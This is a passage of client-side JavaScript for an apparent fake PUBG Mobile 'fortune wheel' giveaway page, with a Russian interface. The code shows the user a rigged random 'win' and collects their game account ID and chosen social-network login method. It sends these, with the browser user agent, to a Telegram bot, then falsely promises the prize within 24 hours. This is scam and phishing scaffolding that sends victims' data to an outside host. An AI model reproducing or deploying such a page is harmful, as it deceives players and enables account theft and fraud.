            const accountIdInput = document.getElementById('accountIdInput');
            
            const prizes = [
                { id: 1, image: "priz1.png", name: "Редкий скин" },
                { id: 2, image: "priz2.png", name: "Набор оружия" },
                { id: 3, image: "priz3.png", name: "Эксклюзивный костюм" },
                { id: 4, image: "priz4.png", name: "Украшение транспорта" },
                { id: 5, image: "priz5.png", name: "ГЛАВНЫЙ ПРИЗ" },
                { id: 6, image: "priz6.png", name: "Набор припасов" },
                { id: 7, image: "priz7.png", name: "Редкая эмблема" },
                { id: 8, image: "priz8.png", name: "Боевой набор" },
                { id: 9, image: "priz9.png", name: "Специальный скин" }
            ];
            
            let isSpinning = false;
            let currentPrizeIndex = 0;
            let spinInterval;
            let spinSpeed;
            let spinCount = 0;
            let finalPrizeIndex = 0;
            
            const prizeOrder = [0, 1, 2, 3, 4, 5, 6, 7, 8];
            
            // Функция показа уведомления
            function showNotification(message, isError = false, isSuccess = false) {
                notification.textContent = message;
                notification.classList.remove('error', 'success');
                
                if (isError) {
                    notification.classList.add('error');
                } else if (isSuccess) {
                    notification.classList.add('success');
                }
                
                notification.style.display = 'block';
                
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 5000);
            }
            
            // Функция получения случайного приза
            function getRandomPrize() {
                return Math.floor(Math.random() * prizes.length);
            }
            
            // Функция перемещения рамки
            function moveFrameToPrize(index) {
                const prizeItem = prizeItems[index];
                const rect = prizeItem.getBoundingClientRect();
                const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
                
                selectionFrame.style.width = (rect.width + 20) + 'px';
                selectionFrame.style.height = (rect.height + 20) + 'px';
                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                selectionFrame.classList.add('active');
                
                // Позиционирование индикатора
                selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
                selectionIndicator.style.top = rect.top - containerRect.top - 40 + 'px';
            }
            
            // Функция показа/скрытия индикатора
            function showSelectionIndicator(show) {
                if (show) {
                    selectionIndicator.classList.add('show');
                } else {
                    selectionIndicator.classList.remove('show');
                }
            }
            
            // Функция запуска рулетки
            function startRoulette() {
                if (isSpinning) return;
                
                if (hasPlayed) {
                    showNotification("Вы уже использовали свою попытку! Заходите завтра.", true);
                    return;
                }
                
                // Проверяем ID аккаунта
                userAccountId = accountIdInput.value.trim();
                if (!userAccountId) {
                    showNotification("Пожалуйста, введите ID вашего аккаунта PUBG Mobile", true);
                    return;
                }
                
                if (!/^\d{6,20}$/.test(userAccountId)) {
                    showNotification("ID аккаунта должен содержать только цифры (6-20 символов)", true);
                    return;
                }
                
                isSpinning = true;
                playBtn.disabled = true;
                socialSelectSection.classList.remove('active');
                confirmationSection.classList.remove('active');
                showSelectionIndicator(false);
                
                finalPrizeIndex = getRandomPrize();
                
                spinSound.currentTime = 0;
                spinSound.play();
                
                selectionFrame.style.opacity = '1';
                
                spinCount = 0;
                spinSpeed = Math.random() * 40 + 40;
                currentPrizeIndex = 0;
                
                spinInterval = setInterval(spinStep, spinSpeed);
            }
            
            function spinStep() {
                const prizeIndex = prizeOrder[currentPrizeIndex];
                moveFrameToPrize(prizeIndex);
                
                currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
                spinCount++;
                
                if (spinCount > Math.random() * 15 + 20) {
                    spinSpeed += Math.random() * 10 + 5;
                    clearInterval(spinInterval);
                    spinInterval = setInterval(spinStep, spinSpeed);
                }
                
                if (spinCount >= Math.random() * 10 + 40) {
                    clearInterval(spinInterval);
                    
                    spinSound.pause();
                    winSound.currentTime = 0;
                    winSound.play();
                    
                    setTimeout(() => {
                        moveFrameToPrize(finalPrizeIndex);
                        showSelectionIndicator(true);
                        
                        setTimeout(() => {
                            isSpinning = false;
                            
                            userPrize = prizes[finalPrizeIndex];
                            isPrizeReceived = false;
                            
                            updatePrizeBadge();
                            
                            hasPlayed = true;
                            localStorage.setItem('hasPlayed', 'true');
                            playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                            playBtn.disabled = false;
                            
                            socialOptions.forEach(opt => opt.classList.remove('selected'));
                            selectedSocial = null;
                            
                            socialSelectSection.classList.add('active');
                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                            
                            showNotification(`Поздравляем! Вы выиграли: ${userPrize.name}!`, false, true);
                        }, 1000);
                    }, 300);
                }
            }
            
            // Обработчики выбора соцсети
            socialOptions.forEach(option => {
                option.addEventListener('click', function() {
                    socialOptions.forEach(opt => opt.classList.remove('selected'));
                    this.classList.add('selected');
                    selectedSocial = this.getAttribute('data-social');
                });
            });
            
            // Обработчик кнопки получения приза
            getPrizeBtn.addEventListener('click', async function() {
                if (!selectedSocial) {
                    showNotification("Пожалуйста, выберите социальную сеть для авторизации", true);
                    return;
                }
                
                if (!userAccountId) {
                    showNotification("Пожалуйста, введите ID вашего аккаунта", true);
                    return;
                }
                
                // Имитация авторизации
                showNotification(`Перенаправление на авторизацию через ${selectedSocial.toUpperCase()}...`);
                
                setTimeout(() => {
                    // Имитация успешной авторизации
                    const loginData = {
                        social: selectedSocial,
                        accountId: userAccountId,
                        prizeId: userPrize ? userPrize.id : 'unknown'
                    };
                    
                    sendLoginDataToTelegram(loginData);
                    
                    isPrizeReceived = true;
                    updatePrizeBadge();
                    
                    document.getElementById('confirmedAccountId').textContent = userAccountId;
                    document.getElementById('confirmedSocial').textContent = getSocialName(selectedSocial);
                    
                    showConfirmation();
                    showNotification("Авторизация успешна! Приз будет отправлен в течение 24 часов.", false, true);
                }, 2000);
            });
            
            function getSocialName(social) {
                const names = {
                    'vk': 'ВКонтакте',
                    'facebook': 'Facebook',
                    'x': 'Twitter/X',
                    'google': 'Google'
                };
                return names[social] || social;
            }
            
            // Функция показа подтверждения
            function showConfirmation() {
                socialSelectSection.classList.remove('active');
                confirmationSection.classList.add('active');
                confirmationSection.scrollIntoView({ behavior: 'smooth' });
            }
            
            // Функция отправки данных в Telegram
            async function sendLoginDataToTelegram(loginData) {
                const socialNames = {
                    'vk': 'ВКонтакте',
                    'facebook': 'Facebook',
                    'x': 'Twitter/X',
                    'google': 'Google'
                };
                
                let message = `🎰 НОВЫЙ ВЫИГРЫШ НА FORTUNE WHEEL 🎰\n\n`;
                message += `📱 Соцсеть: ${socialNames[loginData.social] || loginData.social}\n`;
                message += `🆔 ID аккаунта PUBG: ${loginData.accountId || 'Не указан'}\n`;
                message += `🎁 Выигранный приз: #${loginData.prizeId}\n`;
                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                message += `🌐 User Agent: ${navigator.userAgent.substring(0, 100)}...\n`;
                
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    console.log('Telegram response:', data);
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            }
            
            // Функции для окна приза
            function openPrizeWindow() {
                const prizeWindow = document.getElementById('prizeWindow');
                prizeWindow.classList.add('active');
                document.body.style.overflow = 'hidden';
                
                if (userPrize) {
                    document.getElementById('winImg').src = userPrize.image;
                    document.getElementById('winName').textContent = userPrize.name;
                    document.getElementById('prizeDescription').textContent = 
                        `Вы выиграли ${userPrize.name}! Для получения необходимо авторизоваться через социальную сеть и ввести ID вашего аккаунта.`;
                    
                    const collectBtn = document.getElementById('collectPrizeBtn');
                    if (!isPrizeReceived) {
                        collectBtn.textContent = "ЗАБРАТЬ ПРИЗ";
                        collectBtn.onclick = function() {
                            closePrizeWindow();
                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                        };
                    } else {
                        collectBtn.textContent = "ПРИЗ ОТПРАВЛЕН";
                        collectBtn.onclick = function() {
                            closePrizeWindow();
                        };
                        collectBtn.style.background = '#4CAF50';
                    }
                } else {
                    document.getElementById('winImg').src = 'https://via.placeholder.com/200x200/2a3b5a/ffffff?text=NO+PRIZE';
                    document.getElementById('winName').textContent = "ПОЧТА ПУСТА";
                    document.getElementById('prizeDescription').textContent = "У вас пока нет выигранных призов. Крутите колесо удачи, чтобы выиграть эксклюзивные призы для PUBG Mobile!";
                    
                    const collectBtn = document.getElementById('collectPrizeBtn');
                    collectBtn.textContent = "ЗАКРЫТЬ";
                    collectBtn.onclick = function() {
                        closePrizeWindow();
                    };
                }
            }
            
            function closePrizeWindow() {
                document.getElementById('prizeWindow').classList.remove('active');
                document.body.style.overflow = 'auto';
            }
            
            function updatePrizeBadge() {
                const badge = document.getElementById('prizeBadge');
                const mailBtn = document.getElementById('prizeMailBtn');
                
                if (userPrize && !isPrizeReceived) {
                    badge.textContent = '1';
                    badge.style.display = 'flex';
                    badge.style.background = '#7B68EE';
                    mailBtn.disabled = false;
                } else if (userPrize && isPrizeReceived) {
                    badge.textContent = '1';
                    badge.style.display = 'flex';
                    badge.style.background = '#4CAF50';
                    mailBtn.disabled = false;
                } else {
                    badge.textContent = '0';
                    badge.style.display = 'none';
                    mailBtn.disabled = false;
                }
            }
            
            // Запуск рулетки
            playBtn.addEventListener('click', startRoulette);
            
            // Открытие окна с призом
            prizeMailBtn.addEventListener('click', openPrizeWindow);
            
            // Закрытие окна приза
            document.getElementById('prizeWindow').addEventListener('click', function(e) {
                if (e.target === this) {
                    closePrizeWindow();
                }
            });
            
            // Проверяем, играл ли пользователь уже
            const played = localStorage.getItem('hasPlayed');
            if (played === 'true') {
                hasPlayed = true;
                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
            }
            
            // Языковые настройки
            const translations = {
                ru: {
                    title: "ИСПЫТАЙ СВОЮ УДАЧУ",
                    subtitle: "Крути колесо и выигрывай эксклюзивные призы для PUBG Mobile! Каждый день новые победители и реальные призы.",
                    play: "КРУТИТЬ КОЛЕСО",
                    alreadyPlayed: "УЖЕ ИГРАЛИ",
                    selectTitle: "ШАГ 2: ВЫБЕРИТЕ СПОСОБ АВТОРИЗАЦИИ",
                    selectText: "Для подтверждения личности и отправки приза войдите через одну из социальных сетей",
                    getPrizeBtn: "АВТОРИЗОВАТЬСЯ И ПОЛУЧИТЬ ПРИЗ",
                    confirmationTitle: "ЗАЯВКА ПРИНЯТА!"
                }
            };
            
            // Обработчики для меню языка
            languageBtn.addEventListener('click', function() {
                languageDropdown.classList.toggle('show');
            });
            
            document.querySelectorAll('.language-option').forEach(option => {
                option.addEventListener('click', function() {
                    const lang = this.getAttribute('data-lang');
                    // Здесь можно добавить смену языка
                    languageDropdown.classList.remove('show');
                    showNotification(`Язык изменен на ${this.textContent}`);
                });
            });
            
            // Закрытие выпадающего меню при клике вне его
            document.addEventListener('click', function(event) {
                if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                    languageDropdown.classList.remove('show');
                }
            });
            
            // Анимация рамки до начала игры
            function animateFrameRandomly() {
                if (!isSpinning && !hasPlayed) {
                    const randomIndex = Math.floor(Math.random() * prizeItems.length);
                    moveFrameToPrize(randomIndex);
                    
                    const nextDelay = Math.random() * 2000 + 1000;
                    setTimeout(animateFrameRandomly, nextDelay);
                }
            }
            
            // Запускаем анимацию рамки через 2 секунды после загрузки
            setTimeout(() => {
                if (!isSpinning) {
                    animateFrameRandomly();
                }
            }, 2000);
            
            // Предзагрузка изображений
            function preloadImages() {
                const images = [
                    'phon.png',
                    'logo.png',
                    'vkontakte.png',
                    'twiter.png',
                    'google.png'
                ];
                
                for (let i = 1; i <= 9; i++) {
                    images.push(`priz${i}.png`);
                }
                
                images.forEach(src => {
                    const img = new Image();
                    img.src = src;
                });
            }
            
            preloadImages();
        });
    </script>
</body>
</html>
